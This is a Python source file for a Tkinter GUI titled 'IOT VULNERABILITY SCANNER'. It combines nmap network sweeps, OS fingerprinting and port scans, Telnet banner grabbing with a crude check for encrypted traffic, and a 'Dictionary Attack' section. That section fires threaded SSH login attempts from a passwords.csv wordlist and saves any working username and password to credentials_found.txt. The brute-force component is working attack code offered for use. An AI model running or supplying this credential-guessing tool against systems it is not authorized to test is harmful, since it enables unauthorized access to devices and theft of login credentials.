import csv
import ipaddress
import threading
import time
from paramiko import SSHClient, AutoAddPolicy, AuthenticationException, ssh_exception
import tkinter as tk
from tkinter import ttk

import nmap

import string
import re
import subprocess
import telnetlib


def scan_devices():
    loading_label.config(text="Scanning in progress...")
    scan_button.config(state=tk.DISABLED)

    # Start the scanning process in a separate thread
    scanning_thread = threading.Thread(target=start_scan)
    scanning_thread.start()


def start_scan():
    try:
        # Run nmap command to scan the network and obtain device information
        nmap_command = 'nmap -sn 192.168.2.0/24'
        nmap_process = subprocess.Popen(nmap_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        nmap_output, nmap_error = nmap_process.communicate()

        if nmap_process.returncode == 0:
            lines = nmap_output.decode().split('\n')
            devices = []
            for line in lines:
                if 'Nmap scan report' in line:
                    data = line.split()
                    ip_address = data[4]
                    device_name = data[5] if len(data) > 5 else "Unknown"
                    vendor = ""  # Extract vendor information using additional nmap commands if needed
                    devices.append({'IP': ip_address, 'Name': device_name, 'Vendor': vendor})
            # Swap IP and device name if device name is Unknown
            for device in devices:
                if device['Name'] == 'Unknown':
                    device['IP'], device['Name'] = device['Name'], device['IP']

            # Update the UI with the scan results
            window.after(0, update_scan_results, devices)
        else:
            show_scan_error("Nmap command failed")
    except Exception as e:
        print(f"Error occurred during scanning: {e}")

        # Update the UI with the error message
        window.after(0, show_scan_error, str(e))



def update_scan_results(devices):
    output_text.delete(1.0, tk.END)  # Clear previous output
    if devices:
        output_text.insert(tk.END, "Connected devices:\n")
        for device in devices:
            output_text.insert(tk.END, f"Device {device['IP']} (IP: {device['Name']})\n")
    else:
        output_text.insert(tk.END, "No devices found")

    loading_label.config(text="Scanning completed")
    scan_button.config(state=tk.NORMAL)



def show_scan_error(error_message):
    output_text.delete(1.0, tk.END)  # Clear previous output
    output_text.insert(tk.END, f"Error occurred during scanning: {error_message}")
    loading_label.config(text="Scanning failed")
    scan_button.config(state=tk.NORMAL)


def getInfoWithoutIP():
    try:
        # Run the arp command to obtain the list of connected devices
        arp_output = subprocess.check_output(['arp', '-a']).decode('utf-8')

        # Use regular expressions to extract the IP addresses from the arp output
        ip_pattern = re.compile(r'\d+\.\d+\.\d+\.\d+')
        ip_addresses = ip_pattern.findall(arp_output)

        print(ip_addresses)

        # Initialize an Nmap object
        nm = nmap.PortScanner()

        # For each discovered IP address, perform an OS fingerprint scan and retrieve the OS information
        for ip_address in ip_addresses:
            result = nm.scan(hosts=ip_address, arguments='-O')
            os_info = result['scan'][ip_address]['osmatch']
            print(f'IP address: {ip_address}, OS information: {os_info}')
            print("\n")
    except Exception as e:
        print(f"Error occurred while getting information without IP: {e}")
def scan_ports():
    selected_device = output_text.get(tk.SEL_FIRST, tk.SEL_LAST)
    if selected_device.strip():  # Check if text is selected and not empty
        loading_label.config(text="Scanning ports in progress...")
        scan_ports_button.config(state=tk.DISABLED)

        # Start the port scanning process in a separate thread
        scanning_thread = threading.Thread(target=start_port_scan, args=(selected_device,))
        scanning_thread.start()

def start_port_scan(device):
    command = ["nmap", "-P", device]
    result = subprocess.run(command, capture_output=True, text=True)

    # Extract the open ports from the command output
    open_ports = extract_open_ports(result.stdout)

    # Update the UI with the port scan results
    window.after(0, update_port_scan_results, open_ports)

def extract_open_ports(output):
    open_ports = []
    lines = output.splitlines()
    for line in lines:
        if "/tcp" in line and "open" in line:
            port = line.split("/")[0]
            open_ports.append(port)
    return open_ports

def update_port_scan_results(open_ports):
    output_text.delete(1.0, tk.END)  # Clear previous output
    if open_ports:
        output_text.insert(tk.END, "Open ports:\n")
        for port in open_ports:
            output_text.insert(tk.END, f"Port {port} is open\n")
    else:
        output_text.insert(tk.END, "No open ports found")

    loading_label.config(text="Port scanning completed")
    scan_ports_button.config(state=tk.NORMAL)

def select_device(event):
    scan_ports_button.config(state=tk.NORMAL)

def search_text_telnet(ip_address, port):
    try:
        # Open Telnet connection
        tn = telnetlib.Telnet(ip_address, port)

        # Read the response
        response = tn.read_all()

        # Close the Telnet connection
        tn.close()

        return response

    except ConnectionRefusedError:
        print("Connection refused. Please check the IP address and port.")
    except Exception as e:
        print("An error occurred:", str(e))

def get_received_text():
    ip_address = entry_ip.get()
    port = int(entry_port.get())

    # Search for text using Telnet
    response = search_text_telnet(ip_address, port)

    # Decode the received text using different encodings
    encodings = ["utf-8", "latin-1"]
    decoded_text = ""
    for encoding in encodings:
        try:
            decoded_text = response.decode(encoding)
            break
        except UnicodeDecodeError:
            continue

    # Update the text in the GUI
    text_received.delete("1.0", tk.END)
    text_received.insert(tk.END, decoded_text)

    # Check if the text appears to be encrypted
    if is_encrypted(decoded_text):
        status_label.config(text="The received text is encrypted.")
    else:
        status_label.config(text="The received text is not encrypted.")

def is_encrypted(text):
    # Calculate the percentage of non-printable ASCII characters
    non_printable_count = sum(c not in string.printable for c in text)
    non_printable_percentage = non_printable_count / len(text) * 100

    # Heuristic: If non-printable characters exceed a threshold, consider it encrypted
    threshold = 30
    if non_printable_percentage >= threshold:
        return True
    else:
        return False

def clear_fields():
    entry_ip.delete(0, tk.END)
    entry_port.delete(0, tk.END)
    text_received.delete("1.0", tk.END)
    status_label.config(text="")

def ssh_connect(host, username, password,port):
    ssh_client = SSHClient()
    ssh_client.set_missing_host_key_policy(AutoAddPolicy())
    try:
        ssh_client.connect(host, port=port, username=username, password=password, banner_timeout=300)
        with open("credentials_found.txt", "a") as fh:
            print(f"Username - {username} and Password - {password} found.")
            fh.write(f"Username: {username}\nPassword: {password}\nWorked on host {host}\n")
        result_text.insert(tk.END, f"Username: {username}\nPassword: {password}\n\n")
    except AuthenticationException:
        print(f"Username - {username} and Password - {password} is Incorrect.")
    except ssh_exception.SSHException:
        print("**** Attempting to connect - Rate limiting on server ****")

def get_ip_address():
    while True:
        host = ip_entry.get()

        try:
            ipaddress.IPv4Address(host)
            return host
        except ipaddress.AddressValueError:
            print("Please enter a valid IP address.")

def start_ssh_connection():
    host = get_ip_address()
    port = port_entry.get()
    list_file = "passwords.csv"

    def ssh_connection():
        with open(list_file) as fh:
            csv_reader = csv.reader(fh, delimiter=",")
            for index, row in enumerate(csv_reader):
                if index == 0:
                    continue
                else:
                    t = threading.Thread(target=ssh_connect, args=(host, row[0], row[1],port))
                    t.start()
                    time.sleep(0.2)

    threading.Thread(target=ssh_connection).start()

def main():
    global window, scan_button, output_text, loading_label, scan_ports_button
    global entry_ip, entry_port, text_received, status_label, ip_entry, result_text ,port_entry

    window = tk.Tk()
    window.title("IOT VULNERABILITY SCANNER")
    window.geometry("800x1000")

    headline_label = ttk.Label(window, text="Network Device Scanner", font=("Arial", 16, "bold"))
    headline_label.pack(pady=5)

    # Create and configure the scan button
    scan_button = ttk.Button(window, text="Scan Devices", command=scan_devices, style="ScanButton.TButton")
    scan_button.pack(pady=10)

    # Create and configure the output text field
    output_text = tk.Text(window, width=98, height=10)
    output_text.pack(pady=10)
    output_text.bind('<<Selection>>', select_device)  # Bind the select_device function to the selection event

    # Create and configure the loading label
    loading_label = ttk.Label(window, text="")

    # Create and configure the scan ports button
    scan_ports_button = ttk.Button(window, text="Scan Ports", command=scan_ports, style="ScanButton.TButton", state=tk.DISABLED)
    scan_ports_button.pack(pady=10)

    # Create a custom style for the buttons
    window.style = ttk.Style()
    window.style.configure('ScanButton.TButton', font=('Arial', 12), background='#1e88e5', foreground='white')

    separator = ttk.Separator(window, orient="horizontal")
    separator.pack(fill="x")

    #######################

    headline_label = ttk.Label(window, text="Check Encrypted", font=("Arial", 16, "bold"))
    headline_label.pack(pady=10)

    # Create the Telnet search section
    telnet_search_frame = tk.Frame(window)
    telnet_search_frame.pack(pady=10)

    label_ip = tk.Label(telnet_search_frame, text="Enter the IP address:")
    label_ip.pack(side=tk.LEFT)

    entry_ip = tk.Entry(telnet_search_frame)
    entry_ip.pack(side=tk.LEFT, padx=5)

    label_port = tk.Label(telnet_search_frame, text="Enter the port number:")
    label_port.pack(side=tk.LEFT)

    entry_port = tk.Entry(telnet_search_frame)
    entry_port.pack(side=tk.LEFT, padx=5)

    # Create the buttons section
    buttons_frame = tk.Frame(window)
    buttons_frame.pack(pady=10)

    ###########################

    button_search = tk.Button(buttons_frame, text="Search", command=get_received_text)
    button_search.pack(side=tk.LEFT)

    button_clear = tk.Button(buttons_frame, text="Clear", command=clear_fields)
    button_clear.pack(side=tk.LEFT, padx=5)

    #################

    text_received = tk.Text(window, height=10, width=98)
    text_received.pack(pady=10)

    separator = ttk.Separator(window, orient="horizontal")
    separator.pack(fill="x")



    status_label = tk.Label(window, text="")
    status_label.pack()

    headline_label = ttk.Label(window, text="Dictionary Attack", font=("Arial", 16, "bold"))
    headline_label.pack(pady=5)

    ##############################################
    host_ip_frame = tk.Frame(window)
    host_ip_frame.pack(pady=10)

    ip_label = tk.Label(host_ip_frame, text="Enter the IP address:")
    ip_label.pack(side=tk.LEFT)

    ip_entry = tk.Entry(host_ip_frame)
    ip_entry.pack(side=tk.LEFT, padx=5)

    port_lable = tk.Label(host_ip_frame, text="Enter the port number:")
    port_lable.pack(side=tk.LEFT)

    port_entry = tk.Entry(host_ip_frame)
    port_entry.pack(side=tk.LEFT, padx=5)
    ##################################
    # Create the host IP and Connect section
    connect_button = ttk.Button(host_ip_frame, text="Attack", command=start_ssh_connection)
    connect_button.pack(side=tk.LEFT)

    ##################################


    result_text = tk.Text(window, width=98, height=10)
    result_text.pack(pady=10)

    window.mainloop()

if __name__ == "__main__":
    main()
